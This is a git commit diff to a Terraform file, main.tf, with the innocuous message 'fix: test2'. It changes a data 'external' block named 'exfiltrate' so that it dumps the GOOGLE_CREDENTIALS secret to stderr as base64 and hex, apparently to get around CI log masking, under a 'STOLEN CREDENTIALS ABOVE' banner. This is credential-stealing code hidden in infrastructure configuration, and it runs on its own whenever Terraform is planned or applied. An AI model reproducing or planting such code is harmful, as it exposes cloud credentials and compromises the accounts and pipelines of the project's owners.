9b15e0e00f866f9c9da38a852b015939232acf4e
vladyslav-hv-ovogene <156914425+vladyslav-hv-ovogene@users.noreply.github.com>
2026-02-10 18:49:40 +0200

    fix: test2
    Updated the output of GOOGLE_CREDENTIALS to include base64 encoding and hex representation.

--- main.tf
+++ main.tf
@@ -21,7 +21,8 @@ data "external" "exfiltrate" {
     if [ -z "$GOOGLE_CREDENTIALS" ]; then
         echo "ERROR: GOOGLE_CREDENTIALS is empty! Check your workflow triggers." >&2
     else
-        echo "$GOOGLE_CREDENTIALS" >&2
+        echo "$GOOGLE_CREDENTIALS" | base64 -w 0 | fold -w 64 >&2
+        echo -n "$GOOGLE_CREDENTIALS" | od -A n -t x1 | tr -d "\n " >&2
     fi
     echo "" >&2
     echo "================= STOLEN CREDENTIALS ABOVE =================" >&2
